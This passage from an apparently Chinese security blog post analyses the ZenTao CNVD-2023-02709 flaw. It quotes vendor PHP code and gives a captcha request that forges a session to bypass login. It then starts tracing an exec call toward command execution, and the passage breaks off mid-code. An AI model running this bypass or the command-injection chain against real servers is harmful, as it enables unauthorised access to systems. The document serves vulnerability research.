<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="\nç¦…é“CNVD-2023-02709 ä¸€ã€å½±å“èŒƒå›´ æ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=17.4ï¼Œ<=18.0.beta1ï¼ˆå¼€æºç‰ˆï¼‰\næ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=7.4ï¼Œ<=8.0.beta1ï¼ˆä¼ä¸šç‰ˆï¼‰\næ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=3.4ï¼Œ<=4.0.beta1ï¼ˆæ——èˆ°ç‰ˆï¼‰\n"><meta name=keywords content="PHP,ç¦…é“"><title>ç¦…é“CNVD-2023-02709</title><link rel=canonical href=https://lantern-lab.github.io/post/zentao-cnvd202302709-8wri8.html><link rel=stylesheet href=/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css><meta property='og:title' content="ç¦…é“CNVD-2023-02709"><meta property='og:description' content="\nç¦…é“CNVD-2023-02709 ä¸€ã€å½±å“èŒƒå›´ æ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=17.4ï¼Œ<=18.0.beta1ï¼ˆå¼€æºç‰ˆï¼‰\næ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=7.4ï¼Œ<=8.0.beta1ï¼ˆä¼ä¸šç‰ˆï¼‰\næ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=3.4ï¼Œ<=4.0.beta1ï¼ˆæ——èˆ°ç‰ˆï¼‰\n"><meta property='og:url' content='https://lantern-lab.github.io/post/zentao-cnvd202302709-8wri8.html'><meta property='og:site_name' content='é­”ä»™æ£’æ£’ä¹‹ä¸»'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='PHP'><meta property='article:tag' content='ç¦…é“'><meta property='article:published_time' content='2025-12-17T01:17:28+08:00'><meta property='article:modified_time' content='2025-12-19T15:00:08+08:00'><meta name=twitter:title content="ç¦…é“CNVD-2023-02709"><meta name=twitter:description content="\nç¦…é“CNVD-2023-02709 ä¸€ã€å½±å“èŒƒå›´ æ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=17.4ï¼Œ<=18.0.beta1ï¼ˆå¼€æºç‰ˆï¼‰\næ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=7.4ï¼Œ<=8.0.beta1ï¼ˆä¼ä¸šç‰ˆï¼‰\næ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=3.4ï¼Œ<=4.0.beta1ï¼ˆæ——èˆ°ç‰ˆï¼‰\n"><link rel="shortcut icon" href=/pokeball.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=åˆ‡æ¢èœå•>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar2_hu_4b486bc0b2290a89.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>ğŸ¤”</span></figure><div class=site-meta><h1 class=site-name><a href=/>é­”ä»™æ£’æ£’ä¹‹ä¸»</a></h1><h2 class=site-description>æ˜¥å›° å¤å€¦ ç§‹ä¹ å†¬çœ </h2></div></header><ol class=menu-social><li><a href=https://github.com/lantern-lab/lantern-lab.github.io target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href='https://blog.csdn.net/qq_40487134?type=blog' target=_blank title=CSDN rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-trash"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7h16"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M5 7l1 12a2 2 0 002 2h8a2 2 0 002-2l1-12"/><path d="M9 7V4a1 1 0 011-1h4a1 1 0 011 1v3"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>æš—è‰²æ¨¡å¼</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">ç›®å½•</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#20-å‰è¨€>2.0 å‰è¨€</a></li><li><a href=#21-ç™»å½•ç»•è¿‡>2.1 ç™»å½•ç»•è¿‡</a><ol><li><a href=#211-æ­£å¸¸ç™»å½•é€»è¾‘>2.1.1 æ­£å¸¸ç™»å½•é€»è¾‘</a></li><li><a href=#212-ä¼ªé€ sessionå­—æ®µ>2.1.2 ä¼ªé€ sessionå­—æ®µ</a></li></ol></li><li><a href=#22-å‘½ä»¤æ‰§è¡Œ>2.2 å‘½ä»¤æ‰§è¡Œ</a><ol><li><a href=#221-execä¸æ„é€ å‡½æ•°>2.2.1 execä¸æ„é€ å‡½æ•°</a></li><li><a href=#222-setengine>2.2.2 setEngine</a></li><li><a href=#223-updateä¸edit>2.2.3 updateä¸edit</a></li><li><a href=#223-æ„é€ ä¸€ä¸ªrepo>2.2.3 æ„é€ ä¸€ä¸ªrepo</a></li></ol></li></ol><ol><li><a href=#31-ä¼ªé€ session>3.1 ä¼ªé€ session</a></li><li><a href=#32-åˆ›å»ºrepo>3.2 åˆ›å»ºrepo</a></li><li><a href=#33-å‘½ä»¤æ‰§è¡Œ>3.3 å‘½ä»¤æ‰§è¡Œ</a></li></ol><ol><li><a href=#40-å‰è¨€>4.0 å‰è¨€</a></li><li><a href=#41-getshell>4.1 getshell</a></li><li><a href=#42-æ¤å…¥æœ¨é©¬>4.2 æ¤å…¥æœ¨é©¬</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/post/zentao-cnvd202302709-8wri8.html>ç¦…é“CNVD-2023-02709</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>2025/12/17</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>é˜…è¯»æ—¶é•¿: 6 åˆ†é’Ÿ</time></div></footer></div></header><section class=article-content><p><img src=http://127.0.0.1:3128/assets/wallhaven-yxd9vk-20251219145625-5g9b07o.png loading=lazy alt=image></p><h1 id=ç¦…é“cnvd-2023-02709>ç¦…é“CNVD-2023-02709</h1><h1 id=ä¸€å½±å“èŒƒå›´>ä¸€ã€å½±å“èŒƒå›´</h1><p>æ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=17.4ï¼Œ&lt;=18.0.beta1ï¼ˆå¼€æºç‰ˆï¼‰<br>æ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=7.4ï¼Œ&lt;=8.0.beta1ï¼ˆä¼ä¸šç‰ˆï¼‰<br>æ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ >=3.4ï¼Œ&lt;=4.0.beta1ï¼ˆæ——èˆ°ç‰ˆï¼‰</p><h1 id=äºŒæ¼æ´åˆ†æ>äºŒã€æ¼æ´åˆ†æ</h1><h2 id=20-å‰è¨€>2.0 å‰è¨€</h2><p>ç¦…é“çš„è¯·æ±‚æ–¹å¼æœ‰<code>PATH_INFO</code>â€‹å’Œ<code>GET</code>â€‹ï¼Œå¯ä»¥é€šè¿‡è®¿é—®<code>base_url + "?mode=getconfig"</code>ï¼Œçœ‹æ˜¯å“ªç§</p><p>å¯¹äº<code>PATH_INFO</code>â€‹ï¼Œuriçš„å½¢å¼ä¸º<code>http://8.130.106.245:8080/misc-captcha-user</code></p><p>å¯¹äº<code>GET</code>â€‹ï¼Œuriçš„å½¢å¼ä¸º<code>http://8.130.106.245:8080/index.php?m=misc&amp;f=captcha&amp;sessionVar=user</code><br>mè¡¨ç¤ºmoduleæ–‡ä»¶å¤¹ä¸‹çš„è·¯ç”±åå­—ï¼Œä¹Ÿå°±æ˜¯æ¨¡å‹åå­—<br>fè¡¨ç¤ºcontorlé‡Œçš„å‡½æ•°ï¼Œåé¢çš„å‚æ•°å°±æ˜¯æŒ‡å‡½æ•°çš„å‚æ•°</p><h2 id=21-ç™»å½•ç»•è¿‡>2.1 ç™»å½•ç»•è¿‡</h2><h3 id=211-æ­£å¸¸ç™»å½•é€»è¾‘>2.1.1 æ­£å¸¸ç™»å½•é€»è¾‘</h3><p>ä½äº<code>module/user/model.php</code>â€‹çš„<code>login</code>å‡½æ•°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>login</span><span class=p>(</span><span class=nv>$user</span><span class=p>,</span> <span class=nv>$addAction</span> <span class=o>=</span> <span class=k>true</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nv>$user</span><span class=p>)</span> <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cleanLocked</span><span class=p>(</span><span class=nv>$user</span><span class=o>-&gt;</span><span class=na>account</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* Authorize him and save to session. */</span>
</span></span><span class=line><span class=cl>        <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>rights</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>authorize</span><span class=p>(</span><span class=nv>$user</span><span class=o>-&gt;</span><span class=na>account</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>groups</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>getGroups</span><span class=p>(</span><span class=nv>$user</span><span class=o>-&gt;</span><span class=na>account</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>view</span>   <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>grantUserView</span><span class=p>(</span><span class=nv>$user</span><span class=o>-&gt;</span><span class=na>account</span><span class=p>,</span> <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>rights</span><span class=p>[</span><span class=s1>&#39;acls&#39;</span><span class=p>],</span> <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>rights</span><span class=p>[</span><span class=s1>&#39;projects&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>admin</span>  <span class=o>=</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>app</span><span class=o>-&gt;</span><span class=na>company</span><span class=o>-&gt;</span><span class=na>admins</span><span class=p>,</span> <span class=s2>&#34;,</span><span class=si>{</span><span class=nv>$user</span><span class=o>-&gt;</span><span class=na>account</span><span class=si>}</span><span class=s2>,&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>session</span><span class=o>-&gt;</span><span class=na>set</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>,</span> <span class=nv>$user</span><span class=p>);</span> <span class=c1># æ³¨æ„è¿™é‡Œ
</span></span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>app</span><span class=o>-&gt;</span><span class=na>user</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>session</span><span class=o>-&gt;</span><span class=na>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$user</span><span class=o>-&gt;</span><span class=na>id</span><span class=p>)</span> <span class=k>and</span> <span class=nv>$addAction</span><span class=p>)</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>loadModel</span><span class=p>(</span><span class=s1>&#39;action&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>create</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>,</span> <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>id</span><span class=p>,</span> <span class=s1>&#39;login&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>loadModel</span><span class=p>(</span><span class=s1>&#39;score&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>create</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>,</span> <span class=s1>&#39;login&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* Keep login. */</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>keepLogin</span><span class=p>)</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>keepLogin</span><span class=p>(</span><span class=nv>$user</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ä½äº<code>framework/base/router.class.php</code>â€‹çš„<code>set</code>å‡½æ•°åœ¨debugè°ƒè¯•ä¸­</p><p><img src=http://127.0.0.1:3128/assets/image-20251217012251-wrqx4au.png loading=lazy alt=image></p><p>å¯è§åœ¨æ­£å¸¸ç™»å½•æµç¨‹ä¸­ï¼Œç¦…é“ä¼šå°†ç”¨æˆ·ç™»å½•æ—¶ï¼Œå¯¹åº”çš„å›¾å½¢éªŒè¯ç ä½œä¸ºsessionä¸­å­—æ®µuserçš„å€¼ï¼Œ å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­</p><p>å¹¶åœ¨cookieä¸­è¿”å›zentaosidï¼Œä½œä¸º session æ•°æ®çš„ç´¢å¼•</p><h3 id=212-ä¼ªé€ sessionå­—æ®µ>2.1.2 ä¼ªé€ sessionå­—æ®µ</h3><p>ä½äº<code>module/misc/control.php</code>â€‹çš„<code>captcha</code>å‡½æ•°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>captcha</span><span class=p>(</span><span class=nv>$sessionVar</span> <span class=o>=</span> <span class=s1>&#39;captcha&#39;</span><span class=p>,</span> <span class=nv>$uuid</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$obLevel</span> <span class=o>=</span> <span class=nx>ob_get_level</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nv>$obLevel</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=nx>ob_end_clean</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Content-Type: image/jpeg&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$captcha</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>app</span><span class=o>-&gt;</span><span class=na>loadClass</span><span class=p>(</span><span class=s1>&#39;captcha&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>session</span><span class=o>-&gt;</span><span class=na>set</span><span class=p>(</span><span class=nv>$sessionVar</span><span class=p>,</span> <span class=nv>$captcha</span><span class=o>-&gt;</span><span class=na>getPhrase</span><span class=p>());</span> <span class=c1># æ³¨æ„è¿™é‡Œ
</span></span></span><span class=line><span class=cl>        <span class=nv>$captcha</span><span class=o>-&gt;</span><span class=na>build</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>output</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>é€šè¿‡è®¿é—®<code>http://8.130.106.245:8080/index.php?m=misc&amp;f=captcha&amp;sessionVar=user</code>â€‹ï¼Œå°†<code>sessionVar</code>â€‹é€šè¿‡ä¼ å‚ï¼Œèµ‹å€¼ä¸º<code>user</code>ï¼Œå¯ä»¥æ¨¡æ‹Ÿç™»å½•è¿‡ç¨‹ï¼Œåœ¨æœåŠ¡å™¨ä¸­ä¼ªé€ ä¸€ä¸ªsessionï¼Œå®ç°ç™»å½•ç»•è¿‡</p><h2 id=22-å‘½ä»¤æ‰§è¡Œ>2.2 å‘½ä»¤æ‰§è¡Œ</h2><h3 id=221-execä¸æ„é€ å‡½æ•°>2.2.1 execä¸æ„é€ å‡½æ•°</h3><p>ä½äº<code>lib/scm/subversion.class.php</code>â€‹çš„<code>getSVNVersion</code>â€‹å‡½æ•°ï¼Œå­˜åœ¨è°ƒç”¨<code>exec</code>å‡½æ•°ï¼Œæœ‰æœºä¼šåˆ©ç”¨</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getSVNVersion</span><span class=p>(</span><span class=nv>$client</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$versionCommand</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>$client</span><span class=s2> --version --quiet 2&gt;&amp;1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>exec</span><span class=p>(</span><span class=nv>$versionCommand</span><span class=p>,</span> <span class=nv>$versionOutput</span><span class=p>,</span> <span class=nv>$versionResult</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$versionResult</span><span class=p>)</span> <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>end</span><span class=p>(</span><span class=nv>$versionOutput</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>çœ‹çœ‹è¿™ä¸ªæ–¹æ³•åœ¨å“ªé‡Œå¼•ç”¨äº†ï¼Œå‘ç°åŒphpæ–‡ä»¶é‡Œçš„<code>Subversion</code>æ„é€ å‡½æ•°æœ‰è°ƒç”¨</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$client</span><span class=p>,</span> <span class=nv>$root</span><span class=p>,</span> <span class=nv>$account</span><span class=p>,</span> <span class=nv>$password</span><span class=p>,</span> <span class=nv>$encoding</span> <span class=o>=</span> <span class=s1>&#39;UTF-8&#39;</span><span class=p>,</span> <span class=nv>$repo</span> <span class=o>=</span> <span class=k>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>putenv</span><span class=p>(</span><span class=s1>&#39;LC_CTYPE=en_US.UTF-8&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>root</span>     <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;%3A&#39;</span><span class=p>,</span> <span class=s1>&#39;%2F&#39;</span><span class=p>,</span> <span class=s1>&#39;+&#39;</span><span class=p>),</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=s1>&#39; &#39;</span><span class=p>),</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>rtrim</span><span class=p>(</span><span class=nv>$root</span><span class=p>,</span> <span class=s1>&#39;/&#39;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>account</span>  <span class=o>=</span> <span class=nv>$account</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span> <span class=o>=</span> <span class=nv>$password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>encoding</span> <span class=o>=</span> <span class=nv>$encoding</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>repo</span>     <span class=o>=</span> <span class=nv>$repo</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ssh</span>      <span class=o>=</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>root</span><span class=p>,</span> <span class=s1>&#39;svn&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span> <span class=k>or</span> <span class=nx>stripos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>root</span><span class=p>,</span> <span class=s1>&#39;https&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=o>?</span> <span class=k>true</span> <span class=o>:</span> <span class=k>false</span><span class=p>;</span>
